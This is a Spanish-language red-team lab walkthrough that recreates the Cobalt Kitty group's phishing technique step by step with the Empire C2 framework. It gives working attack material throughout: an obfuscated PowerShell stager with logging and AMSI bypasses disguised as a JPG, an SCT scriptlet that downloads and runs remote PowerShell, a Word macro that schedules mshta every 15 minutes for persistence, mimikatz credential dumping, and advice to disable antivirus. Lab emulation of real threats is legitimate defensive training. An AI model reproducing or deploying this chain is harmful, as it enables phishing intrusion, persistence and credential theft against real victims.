# Laboratorio parte 1

## Referencias: 
- [Cybereason - Operation Cobalt Kitty](https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf)
- [MITRE ATT&CK - Mshta](https://attack.mitre.org/techniques/T1218/005/)
- [LOLBINS](https://lolbas-project.github.io/#)
- [LOLBIN MSHTA](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
- [MITRE ATT&CK - Regsvr32](https://attack.mitre.org/techniques/T1218/010/)
- [SCT Files](https://www.elladodelmal.com/2016/09/ejecucion-de-codigo-en-windows-con.html)

## Objetivos

Obtener el acceso inicial, se realiza una tecnica utilizado por el Grupo Cobalt Kitty. 
La tencica consiste en crear un word con macros maliciosos. Se inicia generando un payload en powershell, se aprovecha del LOLBIN mshta para ejecutar el fichero SCT carga el payload empaquetado. 
El word con macros crea una tarea programada donde cada 15 minutos carga el payload malicioso. 


## Fases que se van a realizar
- **Acceso inicial**: A través de ingeniería social se envía un Word con macros malicioso.
- **Persistencia**: Se crea una tarea programada cada 15 minutos. 


## Walkthrough

### Iniciar el C2
```bash
# Servidor 
docker run -it --rm --name empire-server -p 1337:1337 -p 5000:5000 -v /root/Empire/:/empire -p 80:80 bcsecurity/empire:latest

# Cliente
docker run -it --rm --name empire-client -v /root/Empire/:/empire bcsecurity/empire:latest client

# Connectarse al servidor 
connect -c remote-server
```
> https://bc-security.gitbook.io/empire-wiki/

### Generar el Listener
```bash
(Empire) > uselistener http  

(Empire: uselistener/http) > set Name IAB-LAB
# [*] Set Name to IAB-LAB
(Empire: uselistener/http) > set Port 80
# [*] Set Port to 80
(Empire: uselistener/http) > set Host 206.189.xxx.xxx
# [*] Set Host to 206.189.xxx.xxx
(Empire: uselistener/http) > execute
```

### Generar el payload powershell

```bash
(Empire: uselistener/http) > usestager windows/launcher_bat

(Empire: usestager/windows/launcher_bat) > set Bypasses RastaMouse etw ScriptBlockLogBypass mattifestation
# [*] Set Bypasses to RastaMouse etw ScriptBlockLogBypass mattifestation

(Empire: usestager/windows/launcher_bat) > set Listener IAB-LAB
# [*] Set Listener to IAB-LAB

(Empire: usestager/windows/launcher_bat) > set Obfuscate True
# [*] Set Obfuscate to True

(Empire: usestager/windows/launcher_bat) > set OutFile logo-black.jpg
# [*] Set OutFile to logo-black.jpg

(Empire: usestager/windows/launcher_bat) > execute
# [+] logo-black.jpg written to /empire/empire/client/generated-stagers/logo-black.jpg
```

Nos ubicamos en *~/Empire/empire/client/generated-stagers* y vemos que el mime type no hay ningún problema

```bash
root@ubuntu:~/Empire/empire/client/generated-stagers > file logo-black.jpg
# logo-black.jpg: ASCII text, with very long lines
```
### Generar el Fichero SCT
Plantilla : https://gist.github.com/bohops/6ded40c4989c673f2e30b9a6c1985019 

Para crear la PoC, se sustituie 'calc.exe' por la ruta de descarga del PowerShell ofuscado y luego se ejecuta. El código final será algo similar a esto:

```xml
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
	>

	<!-- regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
	<!-- DFIR -->
	<!--		.sct files are downloaded and executed from a path like this -->
	<!-- Though, the name and extension are arbitary.. -->
	<!-- c:\users\USER\appdata\local\microsoft\windows\temporary internet files\content.ie5\2vcqsj3k\file[2].sct -->
	<!-- Based on current research, no registry keys are written, since call "uninstall" -->


	<!-- Proof Of Concept - Casey Smith @subTee --> 
        <!-- @RedCanary - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct -->
	<script language="JScript">
		<![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("powershell.exe iex (iwr 'http://ip:8888/logo-black.jpg')", 0, false);
			
		]]>
	</script>
</registration>

<public>
    <method name="Exec"></method>
</public>
<script language="JScript">
<![CDATA[

	function Exec()
	{
       var r = new ActiveXObject("WScript.Shell").Run("powershell.exe iex (iwr 'http://ip:8888/logo-black.jpg')", 0, false);
	}

]]>
</script>

</scriptlet>
```
> con vim se puede traducir con :%s/ip\:/xxx.xxx.xxx.xxx\:/g




Se guarda el fichero como logo-final.jpg. Se deja ubicado en ~/uploads/ y asi puede servir como el stager de PowerShell creado previamente.

### Macro Maliciosa

1 - Para crear el fichero word con macros es necesario habilitar el modo desarrollador  
2 - Se guardan los macros en el documento  
3 - Se utiliza la siguiente plantilla para la macro 

```
Sub Auto_open()
Call Shell("schtasks /create /sc MINUTE /tn ""Windows Error Reporting - GROUP ID"" /tr ""mshta.exe javascript:a=GetObject('script:http://ip:8888/logo-final.jpg').Exec();close();"" /mo 15 /F")
End Sub
``` 
4 - Guarda el word para macros


Si todo ha funcionado como se esperaba, se debería haber creado una sesión la marco en el C2 utilizando uno de los métodos creados por un APT real.

```bash

[+] New agent KD2TM5UX checked in                                                                                                                           [*] Sending agent (stage 2) to KD2TM5UX at 82.253.142.172                                                                                                   (Empire: usestager/windows/launcher_bat) > agents                                                                                                                                                                                                                                                                       ┌Agents──────────┬────────────┬─────────────┬──────────────┬────────────┬──────┬───────┬─────────────────────────┬──────────┐                               │ ID │ Name      │ Language   │ Internal IP │ Username     │ Process    │ PID  │ Delay │ Last Seen               │ Listener │                               ├────┼───────────┼────────────┼─────────────┼──────────────┼────────────┼──────┼───────┼─────────────────────────┼──────────┤                               │ 1  │ KD2TM5UX* │ powershell │ 10.0.2.15   │ SRV1\vagrant │ powershell │ 5896 │ 5/0.0 │ 2022-03-30 21:50:07 UTC │ IAB-LAB  │
│    │           │            │             │              │            │      │       │ (2 seconds ago)         │          │
└────┴───────────┴────────────┴─────────────┴──────────────┴────────────┴──────┴───────┴─────────────────────────┴──────────┘

(Empire: agents) > rename KD2TM5UX SRV1

(Empire: credentials) > interact SRV1
(Empire: SRV1) > mimikatz


(Empire: SRV1) > credentials

┌Credentials────┬────────────┬──────────┬──────┬──────────────────────────────────┬─────┬───────────────────────────────────────────────────┬─────────────────────┐
│ ID │ CredType │ Domain     │ UserName │ Host │ Password/Hash                    │ SID │ OS                                                │ Notes               │
├────┼──────────┼────────────┼──────────┼──────┼──────────────────────────────────┼─────┼───────────────────────────────────────────────────┼─────────────────────┤
│ 1  │ hash     │ grailcyber │ SRV1$    │ SRV1 │ afa32d46be0dba4ec4eee8bbae26ce04 │     │ Microsoft Windows Server 2019 Standard Evaluation │ 2022-03-30 21:55:01 │
├────┼──────────┼────────────┼──────────┼──────┼──────────────────────────────────┼─────┼───────────────────────────────────────────────────┼───────────────
──────┤
│ 2  │ hash     │ SRV1       │ vagrant  │ SRV1 │ e02bc503339d51f71d913c245d35b50b │     │ Microsoft Windows Server 2019 Standard Evaluation │ 2022-03-30 21:55:01 │
└────┴──────────┴────────────┴──────────┴──────┴──────────────────────────────────┴─────┴───────────────────────────────────────────────────┴───────────────
──────┘

```

### Problemas

¿No ha funcionado? 
La siguiente lista de comprobación para verificar que esta todo correcto:

- Deshabilitar el AV
- Revisar la conectividad con la victima y el atacante
- Debujea y ejecuta paso a paso por terminal los passos para descubrir en que fase no funciona.











